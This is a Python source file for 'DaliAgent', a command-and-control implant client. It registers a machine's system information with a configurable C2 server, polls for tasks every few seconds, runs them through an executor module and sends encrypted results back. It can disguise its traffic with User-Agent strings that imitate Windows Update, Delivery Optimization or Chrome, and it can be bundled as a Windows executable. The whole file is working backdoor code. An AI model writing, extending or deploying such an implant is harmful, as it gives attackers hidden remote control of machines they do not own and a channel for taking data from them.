import httpx
import time
import uuid
import sys
import os
import asyncio
from dotenv import load_dotenv

load_dotenv()

# Add the parent directory or PyInstaller bundle directory to sys.path
if getattr(sys, 'frozen', False):
    # Running in a bundle (.exe)
    bundle_dir = sys._MEIPASS
    sys.path.append(bundle_dir)
else:
    # Running in normal python environment
    current_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(current_dir)
    sys.path.append(parent_dir)  # For 'shared'
    sys.path.append(current_dir) # For 'executor'

from shared.schemas import Task
from shared.crypto import encrypt_payload, decrypt_payload

from executor import Executor

SERVER_URL = os.getenv("C2_SERVER_URL", "http://localhost:8000")
VERSION = "1.1.0"

def get_agent_id():
    id_file = ".agent_id"
    if os.path.exists(id_file):
        with open(id_file, "r") as f:
            return f.read().strip()
    else:
        new_id = str(uuid.uuid4())
        with open(id_file, "w") as f:
            f.write(new_id)
        return new_id

class DaliAgent:
    def __init__(self):
        self.agent_id = get_agent_id()
        self.identity = os.getenv("AGENT_IDENTITY", "agent")
        self.headers = self._get_identity_headers()
        print(f"[*] Initializing agent [{self.identity}] with ID: {self.agent_id}")

    def _get_identity_headers(self):
        profiles = {
            "browser": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "updater": "Microsoft-Delivery-Optimization/10.0",
            "legit_service": "Windows-Update-Agent/10.0.19041.1",
            "agent": f"Dali-C2-Agent/{VERSION}"
        }
        ua = profiles.get(self.identity, profiles["agent"])
        return {"User-Agent": ua}

    async def register(self):
        print(f"[*] Registering as {self.identity}: {self.agent_id}")
        
        # Gather initial info via sysinfo plugin
        info = Executor._get_sysinfo()
        info["identity_profile"] = self.identity
        
        payload = {
            "agent_id": self.agent_id,
            "info": info,
            "version": VERSION
        }
        
        try:
            encrypted_data = encrypt_payload(payload)
            async with httpx.AsyncClient(headers=self.headers) as client:
                response = await client.post(
                    f"{SERVER_URL}/register", 
                    json={"data": encrypted_data}
                )
                if response.status_code == 200:
                    resp_json = response.json()
                    server_data = decrypt_payload(resp_json.get("data", ""))
                    print(f"[+] Server response: {server_data.get('status')}")
                else:
                    print(f"[!] Registration failed: {response.status_code}")
        except Exception as e:
            print(f"[!] Registration error: {e}")

    async def poll_tasks(self):
        try:
            async with httpx.AsyncClient(headers=self.headers) as client:
                response = await client.get(f"{SERVER_URL}/tasks/{self.agent_id}")
                if response.status_code == 200:
                    resp_json = response.json()
                    server_data = decrypt_payload(resp_json.get("data", ""))
                    tasks_data = server_data.get("tasks", [])
                    
                    for t_data in tasks_data:
                        print(f"[*] Received task: {t_data.get('type')}")
                        result = Executor.execute(t_data.get('type'), t_data.get('payload'))
                        await self.submit_result(t_data.get('id'), result)
        except Exception as e:
            print(f"[!] Polling error: {e}")

    async def submit_result(self, task_id: str, result: dict):
        payload = {
            "task_id": task_id,
            "result": result
        }
        try:
            encrypted_data = encrypt_payload(payload)
            async with httpx.AsyncClient(headers=self.headers) as client:
                await client.post(
                    f"{SERVER_URL}/tasks/{self.agent_id}/results", 
                    json={"data": encrypted_data}
                )
        except Exception as e:
            print(f"[!] Submit result error: {e}")

    async def run(self):
        await self.register()
        while True:
            await self.poll_tasks()
            await asyncio.sleep(5)

if __name__ == "__main__":
    try:
        agent = DaliAgent()
        asyncio.run(agent.run())
    except KeyboardInterrupt:
        print("\n[*] Agent stopped")
